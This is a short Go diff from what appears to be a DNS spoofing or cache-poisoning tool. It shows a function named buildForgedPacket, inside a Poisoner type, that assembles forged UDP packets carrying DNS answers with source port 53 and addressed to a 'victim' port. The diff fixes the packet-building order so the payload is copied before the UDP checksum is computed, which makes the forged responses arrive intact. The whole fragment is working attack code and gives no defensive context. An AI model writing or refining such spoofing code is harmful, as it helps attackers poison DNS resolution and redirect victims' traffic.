@@ -396,14 +396,14 @@ func (p *Poisoner) buildForgedPacket(
 	binary.BigEndian.PutUint16(udp[0:2], srcPort)          // Source port (53)
 	binary.BigEndian.PutUint16(udp[2:4], dstPort)          // Dest port (victim's)
 	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))   // UDP length
-	// UDP checksum is mandatory for correct delivery; 0 causes receiver kernels to drop.
-	// Compute real checksum over pseudo-header + UDP header + payload.
-	binary.BigEndian.PutUint16(udp[6:8], 0) // zero before computing
+
+	// --- DNS Payload (must copy BEFORE computing checksum) ---
+	copy(udp[8:], dnsPayload)
+
+	// UDP checksum must cover the actual payload — compute AFTER copy.
+	binary.BigEndian.PutUint16(udp[6:8], 0) // zero field before computing
 	csum := udpChecksum(srcIP, dstIP, udp[:udpLen])
 	binary.BigEndian.PutUint16(udp[6:8], csum)
-
-	// --- DNS Payload ---
-	copy(udp[8:], dnsPayload)
 
 	return pkt
 }
